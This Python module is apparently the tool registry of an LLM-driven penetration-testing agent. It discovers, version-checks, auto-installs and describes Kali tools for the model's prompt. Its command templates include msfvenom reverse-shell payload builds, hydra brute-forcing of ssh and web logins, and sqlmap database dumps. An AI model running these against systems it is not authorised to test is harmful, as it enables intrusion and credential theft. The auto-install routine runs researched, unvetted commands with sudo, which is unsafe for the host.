"""
Pentronix Tool Registry — discovers, tracks, and auto-installs Kali tools.

Manages the knowledge base of all available security tools on the system.
Provides:
  - System-wide tool discovery (``scan_all``)
  - Auto-installation of missing tools (``auto_install``)
  - LLM function-definition generation (``to_function_definitions``)
  - Availability queries and context injection for the Brain

Persistence uses both a JSON cache (fast startup) and SQLite (authoritative).
"""

from __future__ import annotations

import json
import shutil
import subprocess
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import TYPE_CHECKING, Optional

from utils.logger import get_logger

if TYPE_CHECKING:
    from core.executor import ExecutionResult

log = get_logger(__name__)


# ── Tool catalogue ────────────────────────────────────────────────────────────
# Every tool Pentronix knows about.  scan_all() probes the system for each one.

_TOOL_CATALOGUE: list[dict] = [
    # Scanning
    {"name": "nmap",         "category": "scanning",       "purpose": "Network port and service scanner",                 "install": "sudo apt install -y nmap"},
    {"name": "masscan",      "category": "scanning",       "purpose": "Ultra-fast port scanner",                          "install": "sudo apt install -y masscan"},
    {"name": "rustscan",     "category": "scanning",       "purpose": "Fast port pre-scanner feeding into nmap",          "install": "sudo apt install -y rustscan"},
    {"name": "arp-scan",     "category": "scanning",       "purpose": "ARP host discovery on local network",              "install": "sudo apt install -y arp-scan"},
    # Web
    {"name": "nikto",        "category": "web",            "purpose": "Web server vulnerability scanner",                 "install": "sudo apt install -y nikto"},
    {"name": "gobuster",     "category": "web",            "purpose": "Directory and DNS brute forcer",                   "install": "sudo apt install -y gobuster"},
    {"name": "dirb",         "category": "web",            "purpose": "Web content directory scanner",                    "install": "sudo apt install -y dirb"},
    {"name": "ffuf",         "category": "web",            "purpose": "Fast web fuzzer",                                  "install": "sudo apt install -y ffuf"},
    {"name": "wfuzz",        "category": "web",            "purpose": "Web application fuzzer",                           "install": "sudo apt install -y wfuzz"},
    {"name": "whatweb",      "category": "web",            "purpose": "Web technology fingerprinter",                     "install": "sudo apt install -y whatweb"},
    {"name": "wafw00f",      "category": "web",            "purpose": "WAF detection tool",                               "install": "pip install wafw00f"},
    # Exploitation
    {"name": "sqlmap",       "category": "exploitation",   "purpose": "Automated SQL injection and takeover",             "install": "sudo apt install -y sqlmap"},
    {"name": "hydra",        "category": "exploitation",   "purpose": "Network login brute forcer",                       "install": "sudo apt install -y hydra"},
    {"name": "john",         "category": "exploitation",   "purpose": "Password hash cracker",                            "install": "sudo apt install -y john"},
    {"name": "hashcat",      "category": "exploitation",   "purpose": "GPU-accelerated password cracker",                 "install": "sudo apt install -y hashcat"},
    {"name": "msfconsole",   "category": "exploitation",   "purpose": "Metasploit Framework console",                    "install": "sudo apt install -y metasploit-framework"},
    {"name": "msfvenom",     "category": "exploitation",   "purpose": "Metasploit payload generator",                    "install": "sudo apt install -y metasploit-framework"},
    {"name": "searchsploit", "category": "exploitation",   "purpose": "Offline Exploit-DB search tool",                  "install": "sudo apt install -y exploitdb"},
    # Vulnerability
    {"name": "nuclei",       "category": "vulnerability",  "purpose": "Template-based vulnerability scanner",             "install": "sudo apt install -y nuclei"},
    # Enumeration
    {"name": "enum4linux",   "category": "enumeration",    "purpose": "SMB/NetBIOS enumeration",                         "install": "sudo apt install -y enum4linux"},
    {"name": "smbclient",    "category": "enumeration",    "purpose": "SMB client for share enumeration",                "install": "sudo apt install -y smbclient"},
    {"name": "rpcclient",    "category": "enumeration",    "purpose": "MS-RPC client for enumeration",                   "install": "sudo apt install -y rpcclient"},
    # Recon
    {"name": "subfinder",    "category": "recon",          "purpose": "Subdomain discovery",                              "install": "sudo apt install -y subfinder"},
    {"name": "amass",        "category": "recon",          "purpose": "In-depth attack surface mapping",                  "install": "sudo apt install -y amass"},
    {"name": "theharvester", "category": "recon",          "purpose": "OSINT email/domain/host harvester",               "install": "sudo apt install -y theharvester"},
    # Wireless
    {"name": "aircrack-ng",  "category": "wireless",       "purpose": "Wireless network cracker suite",                  "install": "sudo apt install -y aircrack-ng"},
    {"name": "airmon-ng",    "category": "wireless",       "purpose": "Wireless monitor mode manager",                   "install": "sudo apt install -y aircrack-ng"},
    {"name": "airodump-ng",  "category": "wireless",       "purpose": "Wireless packet capture and analysis",            "install": "sudo apt install -y aircrack-ng"},
    # Utility
    {"name": "netcat",       "category": "utility",        "purpose": "TCP/UDP network utility (nc)",                    "install": "sudo apt install -y netcat-openbsd"},
    {"name": "socat",        "category": "utility",        "purpose": "Multipurpose relay tool",                          "install": "sudo apt install -y socat"},
    {"name": "curl",         "category": "utility",        "purpose": "HTTP client and data transfer",                   "install": "sudo apt install -y curl"},
    {"name": "wget",         "category": "utility",        "purpose": "Non-interactive HTTP/FTP downloader",             "install": "sudo apt install -y wget"},
    {"name": "whois",        "category": "recon",          "purpose": "Domain registrar lookup",                          "install": "sudo apt install -y whois"},
    {"name": "dig",          "category": "recon",          "purpose": "DNS query tool",                                   "install": "sudo apt install -y dnsutils"},
    {"name": "host",         "category": "recon",          "purpose": "DNS lookup utility",                               "install": "sudo apt install -y dnsutils"},
    {"name": "ping",         "category": "utility",        "purpose": "ICMP host reachability check",                    "install": "sudo apt install -y iputils-ping"},
    {"name": "traceroute",   "category": "utility",        "purpose": "Network path tracer",                              "install": "sudo apt install -y traceroute"},
    # Analysis
    {"name": "binwalk",      "category": "analysis",       "purpose": "Firmware analysis and extraction",                "install": "sudo apt install -y binwalk"},
    {"name": "strings",      "category": "analysis",       "purpose": "Extract printable strings from files",            "install": "sudo apt install -y binutils"},
    {"name": "file",         "category": "analysis",       "purpose": "File type identification",                         "install": "sudo apt install -y file"},
    {"name": "exiftool",     "category": "analysis",       "purpose": "Image/file metadata extraction",                  "install": "sudo apt install -y libimage-exiftool-perl"},
    # Sniffing
    {"name": "wireshark",    "category": "sniffing",       "purpose": "Network protocol analyser (GUI)",                 "install": "sudo apt install -y wireshark"},
    {"name": "tcpdump",      "category": "sniffing",       "purpose": "Command-line packet analyser",                    "install": "sudo apt install -y tcpdump"},
    {"name": "ettercap",     "category": "sniffing",       "purpose": "Man-in-the-middle attack suite",                  "install": "sudo apt install -y ettercap-common"},
    {"name": "bettercap",    "category": "sniffing",       "purpose": "Network attack and monitoring framework",         "install": "sudo apt install -y bettercap"},
    # Misc
    {"name": "metasploit-framework", "category": "exploitation", "purpose": "Full Metasploit framework",                "install": "sudo apt install -y metasploit-framework"},
    {"name": "beef-xss",     "category": "exploitation",   "purpose": "Browser Exploitation Framework",                  "install": "sudo apt install -y beef-xss"},
    {"name": "responder",    "category": "exploitation",   "purpose": "LLMNR/NBT-NS/MDNS poisoner",                     "install": "sudo apt install -y responder"},
    {"name": "impacket-scripts", "category": "exploitation", "purpose": "Impacket Python network toolkit",              "install": "sudo apt install -y impacket-scripts"},
]

_COMMON_COMMANDS: dict[str, list[str]] = {
    "nmap": [
        "nmap -sV --top-ports 1000 {target}",
        "nmap -A -O -p- {target}",
        "nmap --script vuln {target}",
        "nmap -sU --top-ports 100 {target}",
        "nmap -sn {target}/24",
    ],
    "nikto": [
        "nikto -h {target}",
        "nikto -h {target} -p 443 -ssl",
    ],
    "gobuster": [
        "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
        "gobuster dns -d {target} -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt",
    ],
    "sqlmap": [
        "sqlmap -u 'http://{target}/page?id=1' --batch --dbs",
        "sqlmap -u 'http://{target}/page?id=1' --batch --dump --level 3",
    ],
    "hydra": [
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form",
        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}",
    ],
    "enum4linux": [
        "enum4linux -a {target}",
    ],
    "searchsploit": [
        "searchsploit {service} {version}",
        "searchsploit -x {edb_id}",
    ],
    "msfconsole": [
        "msfconsole -q -x 'use {module}; set RHOSTS {target}; run; exit'",
    ],
    "msfvenom": [
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe",
    ],
    "aircrack-ng": [
        "aircrack-ng -w /usr/share/wordlists/rockyou.txt {capture_file}",
    ],
    "ffuf": [
        "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt",
    ],
}


# ── ToolInfo dataclass ────────────────────────────────────────────────────────

@dataclass
class ToolInfo:
    """Metadata record for a single system tool."""

    name: str
    path: Optional[str] = None
    version: Optional[str] = None
    category: str = "utility"
    purpose: str = ""
    install_command: str = ""
    common_commands: list[str] = field(default_factory=list)
    found: bool = False
    last_scanned: Optional[str] = None

    def to_dict(self) -> dict:
        """Serialise to a plain dictionary for JSON storage."""
        return asdict(self)

    def to_brief(self) -> str:
        """One-line text summary for LLM context injection."""
        status = "✓ installed" if self.found else "✗ not installed"
        return f"  [{status}] {self.name:18s} ({self.category}) — {self.purpose}"


# ── ToolRegistry ──────────────────────────────────────────────────────────────

class ToolRegistry:
    """Manages discovery, persistence, and auto-installation of system tools.

    Uses a JSON cache for fast reads and SQLite (via MemoryManager) for
    authoritative writes.  The agent queries this registry to determine
    which tools are available and how to use them.
    """

    _CACHE_PATH = Path(__file__).parent.parent / "data" / "tool_registry.json"

    def __init__(self) -> None:
        self._tools: dict[str, ToolInfo] = {}
        self._load_cache()

    # ── Cache I/O ─────────────────────────────────────────────────────────────

    def _load_cache(self) -> None:
        """Load tool data from the JSON cache if available."""
        if self._CACHE_PATH.exists():
            try:
                raw = json.loads(self._CACHE_PATH.read_text(encoding="utf-8"))
                for entry in raw:
                    # Handle old cache entries missing new fields
                    entry.setdefault("install_command", "")
                    info = ToolInfo(**entry)
                    self._tools[info.name] = info
                log.debug("Loaded %d tools from cache", len(self._tools))
            except (json.JSONDecodeError, TypeError) as exc:
                log.warning("Tool cache corrupt (%s) — will rescan", exc)

    def _save_cache(self) -> None:
        """Persist current tool data to JSON cache."""
        self._CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
        data = [t.to_dict() for t in self._tools.values()]
        self._CACHE_PATH.write_text(
            json.dumps(data, indent=2), encoding="utf-8"
        )
        log.debug("Tool cache saved (%d tools)", len(data))

    # ── Discovery ─────────────────────────────────────────────────────────────

    def scan_all(self) -> dict[str, ToolInfo]:
        """Probe the system for every tool in the catalogue.

        Returns:
            Dict mapping tool name → ToolInfo.
        """
        log.info("Scanning system for %d known tools…", len(_TOOL_CATALOGUE))
        now = datetime.now(tz=timezone.utc).isoformat()

        for meta in _TOOL_CATALOGUE:
            name = meta["name"]
            path = shutil.which(name)
            version = self._get_version(name, path) if path else None
            cmds = _COMMON_COMMANDS.get(name, [])

            self._tools[name] = ToolInfo(
                name=name,
                path=path,
                version=version,
                category=meta["category"],
                purpose=meta["purpose"],
                install_command=meta.get("install", f"sudo apt install -y {name}"),
                common_commands=cmds,
                found=path is not None,
                last_scanned=now,
            )

        found_count = sum(1 for t in self._tools.values() if t.found)
        log.info("Tool scan complete: %d/%d tools found", found_count, len(self._tools))
        self._save_cache()
        return dict(self._tools)

    @staticmethod
    def _get_version(name: str, path: str) -> Optional[str]:
        """Best-effort version extraction for a tool."""
        version_flags: dict[str, list[str]] = {
            "nmap": ["--version"], "nikto": ["-Version"], "gobuster": ["version"],
            "sqlmap": ["--version"], "hydra": ["-h"], "msfconsole": ["--version"],
            "hashcat": ["--version"], "aircrack-ng": ["--help"], "nuclei": ["-version"],
            "ffuf": ["-V"], "whatweb": ["--version"],
        }
        flags = version_flags.get(name, ["--version"])
        try:
            result = subprocess.run(
                [path] + flags,
                capture_output=True, text=True, timeout=5,
            )
            output = (result.stdout or result.stderr or "").strip()
            for line in output.splitlines():
                line = line.strip()
                if any(c.isdigit() for c in line) and len(line) < 120:
                    return line[:100]
            return output[:100] if output else None
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return None

    # ── Auto-install ──────────────────────────────────────────────────────────

    async def auto_install(
        self,
        tool_name: str,
        sudo_password: Optional[str] = None,
        on_output: Optional[callable] = None,
    ) -> bool:
        """Auto-install a missing tool.

        First checks the catalogue for a known install command.
        If unknown, uses the InternetResearcher to find installation steps.

        Args:
            tool_name: Name of the tool to install.
            sudo_password: Sudo password for apt install.
            on_output: Streaming output callback.

        Returns:
            True if installation succeeded.
        """
        from core.executor import get_executor

        # Check catalogue first
        install_cmd = None
        for meta in _TOOL_CATALOGUE:
            if meta["name"] == tool_name:
                install_cmd = meta.get("install")
                break

        # If not in catalogue, research it
        if not install_cmd:
            try:
                from core.internet_researcher import get_researcher
                researcher = get_researcher()
                info = await researcher.research_tool(tool_name)
                install_cmd = info.get("install_command", f"sudo apt install -y {tool_name}")
                if on_output:
                    on_output(f"[RESEARCH] Found install method: {install_cmd}\n")
            except Exception as exc:
                log.warning("Failed to research tool %s: %s", tool_name, exc)
                install_cmd = f"sudo apt install -y {tool_name}"

        if on_output:
            on_output(f"[INSTALL] Installing {tool_name}: {install_cmd}\n")

        executor = get_executor()
        result = await executor.execute(
            install_cmd,
            on_output=on_output,
            sudo_password=sudo_password,
            timeout=120,
        )

        if result.success:
            # Re-scan to verify
            path = shutil.which(tool_name)
            if path:
                version = self._get_version(tool_name, path)
                self._tools[tool_name] = ToolInfo(
                    name=tool_name,
                    path=path,
                    version=version,
                    category="unknown",
                    purpose="Auto-installed tool",
                    install_command=install_cmd,
                    found=True,
                    last_scanned=datetime.now(tz=timezone.utc).isoformat(),
                )
                self._save_cache()

                # Log to memory
                try:
                    from memory.memory_manager import get_memory_manager
                    mm = get_memory_manager()
                    await mm.log_tool_install(tool_name, install_cmd)
                except Exception:
                    pass

                log.info("Successfully installed: %s at %s", tool_name, path)
                if on_output:
                    on_output(f"[✓] {tool_name} installed successfully at {path}\n")
                return True
            else:
                log.warning("Install command succeeded but %s not found in PATH", tool_name)
                if on_output:
                    on_output(f"[⚠] Install completed but {tool_name} not found in PATH\n")
                return False
        else:
            log.error("Failed to install %s: %s", tool_name, result.stderr[:200])
            if on_output:
                on_output(f"[✗] Failed to install {tool_name}\n")
            return False

    # ── Queries ───────────────────────────────────────────────────────────────

    def get(self, name: str) -> Optional[ToolInfo]:
        """Return ToolInfo for a tool name, or None."""
        return self._tools.get(name)

    def get_found(self) -> list[ToolInfo]:
        """Return only tools found on the system."""
        return [t for t in self._tools.values() if t.found]

    def get_by_category(self, category: str) -> list[ToolInfo]:
        """Return all installed tools in a category."""
        return [t for t in self._tools.values() if t.category == category and t.found]

    def is_available(self, name: str) -> bool:
        """Check if a tool is installed and available."""
        tool = self._tools.get(name)
        return tool.found if tool else bool(shutil.which(name))

    def needs_scan(self) -> bool:
        """True if registry is empty or stale (>7 days)."""
        if not self._tools:
            return True
        try:
            scanned_strs = [t.last_scanned for t in self._tools.values() if t.last_scanned]
            if not scanned_strs:
                return True
            latest = max(datetime.fromisoformat(s) for s in scanned_strs)
            age = datetime.now(tz=timezone.utc) - latest
            return age.days >= 7
        except (ValueError, TypeError):
            return True

    def all_tools(self) -> list[ToolInfo]:
        """Return all tools (installed or not)."""
        return list(self._tools.values())

    # ── LLM context generation ────────────────────────────────────────────────

    def to_context_string(self) -> str:
        """Build a compact tool list for LLM system prompt injection."""
        found = self.get_found()
        if not found:
            return "No tools discovered yet. Run a tool scan to detect installed tools."

        by_cat: dict[str, list[ToolInfo]] = {}
        for t in found:
            by_cat.setdefault(t.category, []).append(t)

        lines: list[str] = []
        for cat, tools in sorted(by_cat.items()):
            lines.append(f"\n[{cat.upper()}]")
            lines.extend(t.to_brief() for t in tools)
        return "\n".join(lines)

    def get_install_command(self, tool_name: str) -> Optional[str]:
        """Get the known install command for a tool."""
        for meta in _TOOL_CATALOGUE:
            if meta["name"] == tool_name:
                return meta.get("install")
        return None


# ── Singleton ─────────────────────────────────────────────────────────────────
_REGISTRY_INSTANCE: Optional[ToolRegistry] = None


def get_tool_registry() -> ToolRegistry:
    """Return the global ToolRegistry singleton."""
    global _REGISTRY_INSTANCE
    if _REGISTRY_INSTANCE is None:
        _REGISTRY_INSTANCE = ToolRegistry()
    return _REGISTRY_INSTANCE
